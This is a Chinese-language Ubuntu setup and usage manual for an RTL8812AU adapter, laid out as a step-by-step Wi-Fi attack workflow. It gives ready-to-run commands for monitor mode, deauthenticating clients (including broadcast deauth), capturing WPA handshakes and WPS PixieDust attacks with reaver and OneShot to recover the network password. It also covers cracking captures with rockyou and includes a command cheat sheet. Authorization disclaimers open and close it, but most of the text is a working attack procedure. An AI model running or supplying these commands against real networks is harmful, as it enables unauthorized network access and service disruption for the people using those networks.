# Ubuntu 笔记本部署与使用手册（无线审计环境）

> 适用：原生 Ubuntu 系统（20.04/22.04/24.04 均可）+ RTL8812AU USB 网卡
> 用途：仅限对自己拥有或已获书面授权的网络进行安全测试
>
> 说明：本仓库的 wifi-toolkit（Rust 版）目前是 Windows 专用（依赖 netsh/WSL）。
> 在 Ubuntu 上直接使用本文的命令行工具链即可完成全部同等功能，
> 且原生 Linux 下监听/注入/踢线比 Windows+usbipd 稳定得多。

---

## 0. 硬件与兼容性

| 项目 | 说明 |
|---|---|
| 网卡 | RTL8812AU（你手上这块）：Ubuntu 原生支持最好的一类 |
| 监听模式 | ✅ |
| 报文注入（踢线） | ✅ |
| 频段 | 2.4G + 5G 双频 |
| 注意 | 2.4G 抓包时避开 USB3 口/设备（USB3 对 2.4GHz 有宽带干扰），用 USB2 延长线 |

## 1. 系统准备（一次性）

```bash
sudo apt update
sudo apt install -y aircrack-ng wireless-tools wpasupplicant net-tools \
                    pixiewps reaver hcxtools hashcat git build-essential
# 字典
sudo apt install -y wordlists          # /usr/share/wordlists/rockyou.txt.gz
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
# 或直接用已有字典：把 rockyou.txt 拷到任意位置
```

## 2. 网卡识别与驱动

```bash
lsusb | grep -i 8812        # 应看到 0bda:8812
ip link show                # 接口名通常为 wlp?s0… 或 wlx…（按 MAC）
rfkill unblock all          # 解除软阻塞（如有）
```

- Ubuntu 24.04（内核 ≥6.5）：内核自带 `rtw88_8812au` 驱动，即插即用
- 若 `iw dev` 看不到网卡或监听异常，装 DKMS 版驱动：

```bash
sudo apt install -y rtl8812au-dkms      # 若仓库无此包，用下述源码编译
# 源码编译（aircrack-ng 官方驱动，含 6.x 内核支持）：
sudo apt install -y git dkms linux-headers-$(uname -r)
git clone -b v5.6.4.2 https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
sudo make dkms_install                   # 注册为 DKMS 模块，随内核更新自动重编
```

## 3. 标准攻击流程

### 3.0 进入攻击前：停掉会干扰的服务

```bash
sudo systemctl stop NetworkManager wpa_supplicant
sudo airmon-ng check kill               # 杀掉残留干扰进程
```
（攻击结束用 3.7 恢复）

### 3.1 开监听模式

```bash
sudo airmon-ng start wlan1              # 生成 wlan1mon
ip -o link show | grep mon              # 确认 wlan1mon 存在
```

### 3.2 扫描附近 AP

```bash
sudo airodump-ng wlan1mon --band bg     # 2.4G；--band a 为 5G；不指定为全频段跳
```
记下目标：`BSSID`、`频道 CH`、`ESSID`，以及下半区 STATION 表里的已连客户端 MAC。

### 3.3 定向抓握手包

```bash
mkdir -p ~/caps
sudo airodump-ng -c <频道> --bssid <目标BSSID> -w ~/caps/目标名 wlan1mon
```
右上角出现 `WPA handshake: xx:xx…` 即抓到。没抓到 → 3.4 踢线。

### 3.4 踢线（deauth，强制客户端重连）

```bash
# 新开终端；客户端 MAC 来自 3.3 界面下半区 STATION 表
sudo aireplay-ng -0 5 -a <目标BSSID> -c <客户端MAC> wlan1mon
# 不知道客户端 MAC → 广播踢（威力大，仅限自己/授权网络）：
sudo aireplay-ng -0 5 -a <目标BSSID> wlan1mon
```
踢完回到 3.3 的窗口，几秒内应看到 `WPA handshake`。

### 3.5 PixieDust 攻击 WPS（对易感路由秒出 PIN+密码）

```bash
sudo reaver -i wlan1mon -b <目标BSSID> -K 1 -vv
# 或 oneshot（免监听，走 wpa_supplicant）：
git clone https://github.com/aircrack-ng/rtl8812au.git   # 驱动已装可跳过
pip3 install --user wheel colorama
# oneshot:
git clone https://github.com/drygdryg/OneShot.git ~/oneshot
cd ~/oneshot && sudo python3 oneshot.py -i wlan1 -b <目标BSSID>
```
命中输出 `WPS PIN: '…'` 和 `WPA PSK: '…'`（PSK=WiFi 密码）。
**零失败次数，不触发路由器 WPS 锁定**——优先试这条。

### 3.6 爆破握手包

```bash
# 字典：/usr/share/wordlists/rockyou.txt（1400 万条）
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <目标BSSID> ~/caps/目标名-01.cap
# 中文/手机号类密码可自建字典或用规则：
aircrack-ng -w rockyou.txt -r rules/best64.rule -b <BSSID> cap.cap
```

### 3.7 恢复系统网络

```bash
sudo airmon-ng stop wlan1mon
sudo systemctl start NetworkManager wpa_supplicant
```

## 4. 命令速查表

| 目的 | 命令 |
|---|---|
| 看接口 | `ip -o link show` |
| 解阻塞 | `sudo rfkill unblock all` |
| 开监听 | `sudo airmon-ng start wlan1` |
| 关监听 | `sudo airmon-ng stop wlan1mon` |
| 全频扫描 | `sudo airodump-ng wlan1mon` |
| 定向抓包 | `sudo airodump-ng -c CH --bssid BSSID -w out wlan1mon` |
| 踢线 | `sudo aireplay-ng -0 5 -a BSSID -c CLIENT wlan1mon` |
| PixieDust | `sudo reaver -i wlan1mon -b BSSID -K 1 -vv` |
| WPS PIN 爆破 | `sudo reaver -i wlan1mon -b BSSID -vv`（慢，勿对他人网络） |
| 爆破握手 | `aircrack-ng -w rockyou.txt -b BSSID cap.cap` |
| 恢复网络 | `sudo airmon-ng stop wlan1mon; sudo systemctl start NetworkManager` |

## 5. 故障排查

| 现象 | 处理 |
|---|---|
| 接口没出现 | `rfkill list` → 有 soft blocked 就 `rfkill unblock all` |
| NetworkManager 抢接口 | `sudo systemctl stop NetworkManager`；长期可 `sudo systemctl mask NetworkManager` |
| airodump 一个 AP 都没有 | 检查 `iw dev` 频段模式；2.4G 避开 USB3 口；换 USB 口 |
| 注入测试失败 | `sudo aireplay-ng --test wlan1mon`；确认用 aircrack DKMS 驱动而非内核 rtw88 |
| dmesg 报 firmware missing | `sudo apt install -y linux-firmware` |
| 踢线后设备不重连 | 目标 AP 可能开了客户端隔离/保护；换 PixieDust 路线 |

## 6. 与 Windows 版 wifi-toolkit 的对应关系

| Windows 工具功能 | Ubuntu 等价命令 |
|---|---|
| 扫描网卡（netsh 4 轮） | `airodump-ng wlan1mon` |
| 接入网卡（usbipd） | 不需要——网卡本机直插 |
| 抓包+自动踢线 | 3.3 + 3.4 两步 |
| PixieDust | reaver -K 1 / oneshot |
| 爆破（rockyou/模式字典） | aircrack-ng -w |
| 命中记录 hits.json | 自行重定向日志（`tee`） |

## 7. 授权与法律

仅对**自己拥有**或**已获书面授权**的网络使用。未经授权访问他人网络属违法行为。
